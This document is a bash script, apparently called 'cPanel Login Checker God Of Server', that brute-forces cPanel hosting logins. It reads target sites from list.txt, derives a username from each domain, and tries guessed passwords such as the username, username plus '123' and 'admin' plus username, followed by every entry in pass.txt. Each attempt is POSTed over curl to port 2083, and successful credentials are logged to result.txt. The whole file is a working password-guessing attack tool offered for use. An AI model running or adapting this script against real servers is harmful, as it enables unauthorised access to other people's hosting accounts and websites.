#!/bin/bash


SITES="list.txt"
PASSWORDS="pass.txt"
RESULTS="result.txt"


DEFAULT_PORT=2083


> "$RESULTS"


function show_ascii_art {
    echo -e "\e[36m"
    echo "  ____ _               _      _            _             "
    echo " / ___| |__   ___  ___| | __ | | ___   ___| | _____ _ __ "
    echo "| |   | '_ \ / _ \/ __| |/ / | |/ _ \ / __| |/ / _ \ '__|"
    echo "| |___| | | |  __/ (__|   <  | | (_) | (__|   <  __/ |   "
    echo " \____|_| |_|\___|\___|_|\_\ |_|\___/ \___|_|\_\___|_|   "
    echo -e "\e[0m"
    echo "=========================================="
    echo "      cPanel Login Checker God Of Server"
    echo "=========================================="
}


function check_login {
    local site=$1
    local user=$2
    local pass=$3
    local port=${4:-$DEFAULT_PORT}

    
    response=$(curl -s -o /dev/null -w "%{http_code}" --data "user=${user}&pass=${pass}" "https://${site}:${port}/login")

    if [ "$response" == "200" ]; then
        echo -e "\e[32mLogin sukses: ${site} dengan user: ${user} dan password: ${pass}\e[0m"
        echo "Login sukses: ${site} dengan user: ${user} dan password: ${pass}" >> "$RESULTS"
    else
        echo "Login gagal: ${site} dengan user: ${user} dan password: ${pass}"
    fi
}


function extract_domain {
    local url=$1
    local domain=$(echo "$url" | awk -F[/:] '{print $4}')
    local user=$(echo "$domain" | cut -d '.' -f1)
    echo "$user"
}


show_ascii_art


while IFS= read -r site; do
    domain_user=$(extract_domain "$site")

    
    check_login "$site" "$domain_user" "$domain_user" "$DEFAULT_PORT"
    check_login "$site" "$domain_user" "${domain_user}123" "$DEFAULT_PORT"
    check_login "$site" "$domain_user" "admin${domain_user}" "$DEFAULT_PORT"

    
    while IFS= read -r pass; do
        check_login "$site" "$domain_user" "$pass" "$DEFAULT_PORT"
    done < "$PASSWORDS"
done < "$SITES"
